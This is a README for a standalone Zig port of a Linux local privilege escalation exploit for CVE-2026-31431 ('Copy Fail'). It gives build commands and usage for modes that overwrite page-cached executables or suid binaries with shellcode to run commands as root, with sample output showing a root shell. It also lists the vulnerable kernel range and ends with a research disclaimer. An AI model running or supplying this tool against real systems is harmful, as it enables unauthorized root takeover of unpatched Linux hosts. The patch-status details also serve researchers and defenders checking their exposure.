# Copy Fail (CVE-2026-31431) Zig implementation
Zig implementation of the 732 Byte [proof of concept](https://github.com/theori-io/copy-fail-CVE-2026-31431) for the Copy Fail Linux LPE (CVE-2026-31431), which was disclosed by Theori / Xint on April 29th 2026
The writeup can be found at [copy.fail](https://copy.fail).

This implementation has no runtime dependencies and can be run as a standalone binary.

# Build
Building the exploit requires zig version 0.16.0 or higher, which can be installed from [ziglang.org](https://ziglang.org/download/).
To build the exploit, run the following command in the terminal:

```bash
zig build
```
Optionally, it can be cross-built for a different Target
e.g.
```bash
zig build -Dcpu=baseline -Dtarget=aarch64-linux-musl -Doptimize=ReleaseSmall
```
or with uncompressed payloads
```bash
zig build -Dcompress=false
```

# Usage
either run the compiled binary or use zig to run it
```bash
zig-out/bin/copyfail
OR
zig build run
```

```
$ zig-out/bin/copyfail
Usage:
  run     <path> <data> [offset] [-- args...] - Write data to the executable at the given offset (default 0) and run it
  sudo    <suid_path>   [command...]          - Runs a command as root by writing shellcode to a suid binary. 
                                                (the first argument of command must be the full path to program to run)
  modify  <path> <data> [offset]              - Write data to the file at the given offset (default 0)
  reset   <path>                              - Reset the file to its original state
  help                                        - Show this message
```

The executable can be run with 4 different commands:

**`run`** 
first writes the provided data at the given offset (default 0) to the executable at the provided path, then runs it.
After the execution is finished, the file is reset to its original state using posix_fadvise.

Example:
```bash
copyfail run /path/to/exe $(cat shellcode_bin) -- /bin/sh
```

**`sudo`** 
writes included shellcode to a suid binary and executes it to run a command as root.
The source code of the shellcode can be found in `payloads/sudo.zig`. 
The first argument of the command must be the full path to the program as the shellcode does not search for the program to run.
After the execution is finished, the file is reset as in the `run` command.

Example:
```bash
$ copyfail sudo /usr/bin/su /usr/bin/whoami
root
```

**`modify`** 
writes the provided data at the given offset (default 0) to the file at the provided path, without executing it.
After the modification, the file is **NOT** reset. Use the `reset` command to reset it.

Example:
```bash
copyfail modify /path/to/file "My new content" 1337
```

**`reset`** 
resets the file at the provided path to its original state using posix_fadvise. This discards the cached page and will read the content from disk when accessed again.

Example:
```bash
copyfail reset /path/to/file
```

**`help`**
prints the usage message.

# Affected kernels (from [copy-fail-c](https://github.com/tgies/copy-fail-c))
```
floor:    torvalds/linux 72548b093ee3   August 2017, v4.14
                                        (AF_ALG iov_iter rework that
                                         introduced the file-page write
                                         primitive via splice into the AEAD
                                         scatterlist)

ceiling:  torvalds/linux a664bf3d603d   April 2026, mainline
                                        (reverts the 2017 algif_aead
                                         in-place optimization; separates
                                         source and destination scatterlists
                                         so page-cache pages can no longer
                                         be a writable crypto destination)
```

In between: every major distro kernel that didn't backport the fix.
Ubuntu, RHEL, SUSE, Amazon Linux, and Debian were all confirmed vulnerable
in their stock cloud-image kernels at disclosure time. Distro-level
backports started rolling out around 2026-04-29 alongside the public
disclosure. To verify whether a target kernel is in-window, check whether
`a664bf3d603d` (or its distro-specific backport) is present in the kernel's
git log or the distro's changelog.

# License and credits
Discovery and original disclosure of CVE-2026-31431: Theori / Xint.
Public writeup at [copy.fail](https://copy.fail/).

This zig implementation: Emmmmllll <emil.sottek@gmail.com>

The zig compiler and standard library: [Zig Software Foundation](https://ziglang.org/) on MIT terms <https://codeberg.org/ziglang/zig>.

The exploit and payload are published for security-research and
defensive-detection purposes. Use against systems you do not own or have
explicit authorization to test is your problem, not the author's.